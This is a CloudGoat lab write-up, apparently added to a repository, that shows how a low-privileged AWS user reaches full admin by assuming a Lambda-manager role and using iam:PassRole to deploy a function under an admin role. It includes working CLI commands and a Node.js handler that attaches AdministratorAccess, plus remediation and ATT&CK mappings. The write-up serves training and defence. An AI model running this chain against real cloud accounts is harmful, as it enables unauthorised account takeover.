@@ -1,0 +1,419 @@
+# 🥷 CloudGoat: Lambda Privesc
+
+_Write-up: Escalating from a low-privileged user to full admin by passing an over-powered role to a Lambda function you control_
+
+## 🧭 Overview
+
+**Scenario:** `lambda_privesc` \
+**Platform:** [CloudGoat (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/cloudgoat) \
+**Tools:** AWS CLI + Node.js \
+**Objective:** Starting as the low-privileged `chris` user, escalate to full administrator by assuming a Lambda-manager role and using `iam:PassRole` to hand an admin-grade execution role to a function we write.
+
+## ⚔️ Attack Path Summary
+
+`chris` (`sts:AssumeRole` + `iam:Get*`/`List*`) → Assume `lambdaManager` role (`lambda:*` + `iam:PassRole`) → Create a Lambda that runs as the admin `debug` role → Invoke it to attach `AdministratorAccess` to `chris` → Full admin
+
+The pivot is `iam:PassRole`. Chris can't touch IAM directly, but he can pass a powerful role to a compute service and let *that* service do the IAM write on his behalf.
+
+## 🔑 Phase 1: Initial Access
+
+The scenario hands you a single access key pair for `chris`.
+
+#### Configure Profile
+
+```bash
+aws configure --profile chris
+# Access Key: AKIA****************
+# Secret Key: nW7FQL1oE3Uu8/e3TQ3go5joVJILkS68********
+```
+
+#### Validate Credentials
+
+```bash
+aws sts get-caller-identity --profile chris
+```
+
+```json
+{
+  "UserId": "AIDA****************",
+  "Account": "7912********",
+  "Arn": "arn:aws:iam::7912********:user/chris-cgidtlapz180te"
+}
+```
+
+We land as `chris`. First job: map what `chris` can do and what roles exist.
+
+## 🗺️ Phase 2: Enumerate Chris's Permissions
+
+```bash
+aws iam list-attached-user-policies --user-name chris-cgidtlapz180te --profile chris
+# → cg-chris-policy-cgidtlapz180te
+
+aws iam get-policy-version \
+  --policy-arn arn:aws:iam::7912********:policy/cg-chris-policy-cgidtlapz180te \
+  --version-id v1 --profile chris
+```
+
+```json
+{
+  "PolicyVersion": {
+    "Document": {
+      "Statement": [
+        {
+          "Sid": "chris",
+          "Effect": "Allow",
+          "Action": ["sts:AssumeRole", "iam:List*", "iam:Get*"],
+          "Resource": "*"
+        }
+      ]
+    }
+  }
+}
+```
+
+#### Key Finding
+
+Chris has broad IAM **read** (`iam:Get*`/`iam:List*`) and — the important one — `sts:AssumeRole` over `Resource: *`. He can't write IAM directly, but he can assume any role whose trust policy lets him in.
+
+## 🧩 Phase 3: Inventory the Roles
+
+```bash
+aws iam list-roles --profile chris \
+  | jq -r '.Roles[] | select(.RoleName | startswith("cg-"))'
+```
+
+Two custom roles stand out.
+
+#### The `debug` role — admin, but only for Lambda
+
+```json
+{
+  "RoleName": "cg-debug-role-cgidtlapz180te",
+  "Description": "CloudGoat debug role",
+  "AssumeRolePolicyDocument": {
+    "Statement": [
+      {
+        "Effect": "Allow",
+        "Principal": { "Service": "lambda.amazonaws.com" },
+        "Action": "sts:AssumeRole"
+      }
+    ]
+  }
+}
+```
+
+```bash
+aws iam list-attached-role-policies --role-name cg-debug-role-cgidtlapz180te --profile chris
+# → AdministratorAccess
+```
+
+The `debug` role carries **`AdministratorAccess`** — but its trust policy only allows `lambda.amazonaws.com` to assume it. A human can't assume it directly; only a Lambda running as this role can. That trust *looks* like a control, but Chris doesn't need to assume `debug` — he only needs a function that runs as it.
+
+> **The attacker doesn't need to become the trusted principal — only to control the trusted service.**
+
+#### The `lambdaManager` role — the bridge
+
+```json
+{
+  "RoleName": "cg-lambdaManager-role-cgidtlapz180te",
+  "Description": "CloudGoat Lambda manager role",
+  "AssumeRolePolicyDocument": {
+    "Statement": [
+      {
+        "Effect": "Allow",
+        "Principal": { "AWS": "arn:aws:iam::7912********:user/chris-cgidtlapz180te" },
+        "Action": "sts:AssumeRole"
+      }
+    ]
+  }
+}
+```
+
+```bash
+aws iam get-policy-version \
+  --policy-arn arn:aws:iam::7912********:policy/cg-lambdaManager-policy-cgidtlapz180te \
+  --version-id v1 --profile chris
+```
+
+```json
+{
+  "PolicyVersion": {
+    "Document": {
+      "Statement": [
+        {
+          "Sid": "lambdaManager",
+          "Effect": "Allow",
+          "Action": ["lambda:*", "iam:PassRole"],
+          "Resource": "*"
+        }
+      ]
+    }
+  }
+}
+```
+
+#### Key Finding
+
+The `lambdaManager` role trusts exactly one principal — **`chris`** — and grants `lambda:*` plus `iam:PassRole`. That is the whole exploit in two lines: full control over Lambda, plus the right to hand *any* role to a function.
+
+## 🔗 Phase 4: The Attack Path
+
+Each grant is unremarkable alone; chained, they walk straight to admin:
+
+1. **`chris` can assume the `lambdaManager` role** — its trust policy names him.
+2. **`lambdaManager` has `lambda:*` + `iam:PassRole`** — it can create functions and attach any execution role to them.
+3. **The `debug` role is admin** and trusts `lambda.amazonaws.com` — a function can run as it.
+4. So: assume `lambdaManager` → create a Lambda whose execution role is `debug` → the function runs with `AdministratorAccess` → have it grant `chris` admin.
+
+`iam:PassRole` is the linchpin. It doesn't let you *use* a role; it lets you *give* it to a service that will. But it takes **two** aligned conditions, not one — `PassRole` alone doesn't bypass a trust policy: the caller must hold `iam:PassRole` for the role (`lambdaManager` does, over `*`), **and** the role must trust the service (`debug` trusts `lambda.amazonaws.com`). Both line up here. Miss either one and the escalation falls apart.
+
+## 🎭 Phase 5: Assume the Lambda-Manager Role
+
+```bash
+aws sts assume-role \
+  --role-arn arn:aws:iam::7912********:role/cg-lambdaManager-role-cgidtlapz180te \
+  --role-session-name lambda-manager-session \
+  --profile chris
+```
+
+```json
+{
+  "Credentials": {
+    "AccessKeyId": "ASIA****************",
+    "SecretAccessKey": "Hjm40R0a7aBUCinRey0Bu8seymXd9t50********",
+    "SessionToken": "FwoGZXIvYXdzEDQaDCX78W64kYIfCZBr4i...********",
+    "Expiration": "2026-08-13T19:12:48+00:00"
+  },
+  "AssumedRoleUser": {
+    "Arn": "arn:aws:sts::7912********:assumed-role/cg-lambdaManager-role-cgidtlapz180te/lambda-manager-session"
+  }
+}
+```
+
+Drop those temporary credentials into a named profile (`chris_lambda`) and confirm the new identity:
+
+```bash
+aws sts get-caller-identity --profile chris_lambda
+```
+
+```json
+{
+  "UserId": "AROA****************:lambda-manager-session",
+  "Account": "7912********",
+  "Arn": "arn:aws:sts::7912********:assumed-role/cg-lambdaManager-role-cgidtlapz180te/lambda-manager-session"
+}
+```
+
+## 🧨 Phase 6: Write the Malicious Function
+
+The function runs as `debug` (admin), so it can do the one thing `chris` can't: attach a policy to himself. A few lines with the AWS SDK for JavaScript:
+
+```javascript
+const {
+  IAMClient,
+  AttachUserPolicyCommand,
+} = require("@aws-sdk/client-iam");
+
+const iam = new IAMClient({});
+
+exports.handler = async () => {
+  const userName = "chris-cgidtlapz180te";
+  const policyArn = "arn:aws:iam::aws:policy/AdministratorAccess";
+
+  await iam.send(
+    new AttachUserPolicyCommand({
+      UserName: userName,
+      PolicyArn: policyArn,
+    })
+  );
+
+  return {
+    statusCode: 200,
+    body: JSON.stringify({
+      message: `AdministratorAccess attached to ${userName}`,
+    }),
+  };
+};
+```
+
+Bundle it with its dependency — the package just needs to contain the SDK the handler imports.
+
+```bash
+mkdir cg-admin-function && cd cg-admin-function
+# ...write index.js here...
+npm i @aws-sdk/client-iam
+zip -r function.zip index.js node_modules package.json package-lock.json
+```
+
+## 🚀 Phase 7: Deploy with the Admin Role Passed In
+
+This is where `iam:PassRole` earns its keep — `--role` points at the admin `debug` role:
+
+```bash
+aws lambda create-function \
+  --function-name cg-admin-function \
+  --runtime nodejs22.x \
+  --zip-file fileb://function.zip \
+  --handler index.handler \
+  --role arn:aws:iam::7912********:role/cg-debug-role-cgidtlapz180te \
+  --region us-east-1 \
+  --profile chris_lambda
+```
+
+```json
+{
+  "FunctionName": "cg-admin-function",
+  "FunctionArn": "arn:aws:lambda:us-east-1:7912********:function:cg-admin-function",
+  "Role": "arn:aws:iam::7912********:role/cg-debug-role-cgidtlapz180te",
+  "State": "Pending",
+  "StateReasonCode": "Creating"
+}
+```
+
+AWS authorizes the request because the caller holds `iam:PassRole` for the role. IAM checks *that you may pass it* — never *whether its privilege level fits the workload*. Scoping the resource to approved roles is the account owner's job, not something IAM enforces.
+
+The `"State": "Pending"` shows `create-function` is asynchronous — the function moves `Pending → Active` before it's invokable. Timing is environment-dependent, so a script should wait for `Active` rather than a fixed `sleep`:
+
+```bash
+aws lambda wait function-active-v2 \
+  --function-name cg-admin-function --region us-east-1 --profile chris_lambda
+```
+
+## 🎯 Phase 8: Invoke → Full Admin
+
+```bash
+aws lambda invoke \
+  --function-name cg-admin-function \
+  --region us-east-1 \
+  --profile chris_lambda \
+  result.txt
+```
+
+```json
+{
+  "StatusCode": 200,
+  "ExecutedVersion": "$LATEST"
+}
+```
+
+```json
+// result.txt
+{"statusCode":200,"body":"{\"message\":\"AdministratorAccess attached to chris-cgidtlapz180te\"}"}
+```
+
+#### Verify the New Powers
+
+Back on the original `chris` profile — the same access key we started with:
+
+```bash
+aws iam list-attached-user-policies --user-name chris-cgidtlapz180te --profile chris
+```
+
+```json
+{
+  "AttachedPolicies": [
+    { "PolicyName": "cg-chris-policy-cgidtlapz180te", "PolicyArn": "arn:aws:iam::7912********:policy/cg-chris-policy-cgidtlapz180te" },
+    { "PolicyName": "AdministratorAccess",            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess" }
+  ]
+}
+```
+
+`AdministratorAccess` is now attached to `chris` directly. We are full admin using the exact key we were handed at the start — no role juggling required from here on.
+
+## 📐 Attack Chain Diagram
+
+```
+┌────────────────────────────────────┐
+│  chris                             │
+│  sts:AssumeRole + iam:Get*/List*   │
+└───────────────┬────────────────────┘
+                │ sts:AssumeRole (trust names chris)
+                ▼
+┌────────────────────────────────────┐
+│  cg-lambdaManager role             │
+│  lambda:*  +  iam:PassRole  ★       │
+└───────────────┬────────────────────┘
+                │ create-function --role cg-debug-role
+                ▼
+┌────────────────────────────────────┐
+│  cg-admin-function                 │
+│  runs as cg-debug-role (Admin)     │
+│  trust: lambda.amazonaws.com       │
+└───────────────┬────────────────────┘
+                │ invoke → AttachUserPolicy
+                ▼
+┌────────────────────────────────────┐
+│  chris + AdministratorAccess       │
+│  == full administrator             │
+└────────────────────────────────────┘
+```
+
+## 🚨 Weaknesses Demonstrated
+
+| # | Weakness | CWE |
+|---|----------|-----|
+| 1 | `iam:PassRole` granted over `Resource: *`, allowing any role — including an admin one — to be passed to a service | CWE-732 |
+| 2 | An `AdministratorAccess` execution role trusting `lambda.amazonaws.com` with no scoping on *which* functions may use it | CWE-269 |
+| 3 | `lambda:*` + `iam:PassRole` on the same role turns compute-management into IAM write | CWE-269 |
+
+## 💡 Remediation
+
+1. **Never grant `iam:PassRole` over `*`.** Scope it to the specific, least-privileged execution roles a principal legitimately needs to pass — never an admin role, never a wildcard.
+2. **Don't attach `AdministratorAccess` to execution roles.** A Lambda's role should carry only the permissions that function needs. An admin-grade `debug` role is a standing privesc target the moment anyone can pass it.
+3. **Use both resource scoping and a `PassedToService` condition — they do different jobs.** The `Resource` element restricts *which role* may be passed; `iam:PassedToService` restricts *which service* receives it. Neither replaces the other. Scope `Resource` to specific, least-privileged execution-role ARNs, and add `Condition: { StringEquals: { "iam:PassedToService": "lambda.amazonaws.com" } }` as defense-in-depth.
+4. **Separate compute administration from IAM.** `lambda:*` is powerful; combined with `iam:PassRole` it becomes IAM write. Split those duties across roles.
+5. **Bound delegated admins with permissions boundaries and SCPs.** Attach a permissions boundary to roles delegated admins can pass, and use SCP guardrails to deny passing highly privileged roles org-wide.
+6. **Detect high-privilege role passing broadly — not just via Lambda.** The primitive is *attacker-controlled service config + `iam:PassRole` + a privileged execution role*; the same chain works through ECS, EC2 instance profiles, CodeBuild, Glue, and more. Alert on any low-priv principal passing an admin-grade role to *any* service.
+
+## 🎯 MITRE ATT&CK Mapping
+
+| Tactic | Technique | ID |
+|--------|-----------|-----|
+| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 |
+| Privilege Escalation | Account Manipulation | T1098 |
+| Execution | Serverless Execution | T1648 |
+| Discovery | Cloud Infrastructure Discovery | T1580 |
+
+## 🛠️ Commands Reference
+
+```bash
+# Recon
+aws sts get-caller-identity --profile chris
+aws iam list-attached-user-policies --user-name <chris> --profile chris
+aws iam get-policy-version --policy-arn <arn> --version-id v1 --profile chris
+aws iam list-roles --profile chris | jq -r '.Roles[] | select(.RoleName | startswith("cg-"))'
+aws iam list-attached-role-policies --role-name <role> --profile chris
+
+# Assume the lambda-manager role
+aws sts assume-role \
+  --role-arn <lambdaManager-role-arn> \
+  --role-session-name lambda-manager-session --profile chris
+
+# Build & deploy the malicious function
+npm i @aws-sdk/client-iam
+zip -r function.zip index.js node_modules package.json package-lock.json
+aws lambda create-function --function-name cg-admin-function \
+  --runtime nodejs22.x --zip-file fileb://function.zip --handler index.handler \
+  --role <debug-role-arn> --region us-east-1 --profile chris_lambda
+
+# Trigger → privesc
+aws lambda invoke --function-name cg-admin-function --region us-east-1 \
+  --profile chris_lambda result.txt
+
+# Verify
+aws iam list-attached-user-policies --user-name <chris> --profile chris
+```
+
+## 📚 Additional Resources
+
+- [AWS IAM: PassRole permission](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html)
+- [Lambda execution roles](https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html)
+- [Rhino Security Labs: AWS IAM Privilege Escalation methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
+- [CloudGoat lambda_privesc scenario](https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/lambda_privesc)
+
+## 🎓 Key Takeaways
+
+1. **`iam:PassRole` is a privilege-escalation primitive.** It never lets you use a role yourself — it lets you hand one to a service that will. Over `Resource: *`, that means handing an admin role to a Lambda you wrote.
+2. **A role's trust policy is only half the story.** The `debug` role blocked human assumption by trusting only `lambda.amazonaws.com` — but that's precisely the service an attacker with `lambda:*` can drive. "Only Lambda can assume it" is not a control when you control Lambda.
+3. **Chain the small grants.** `sts:AssumeRole`, `lambda:*`, `iam:PassRole`, and an over-permissive execution role are each ordinary. Combined, they walk a read-only user straight to `AdministratorAccess`.
+4. **Escalate through the service, not the principal.** When you can't write IAM directly, find a compute service you can run as a powerful role — and let it make the write for you.
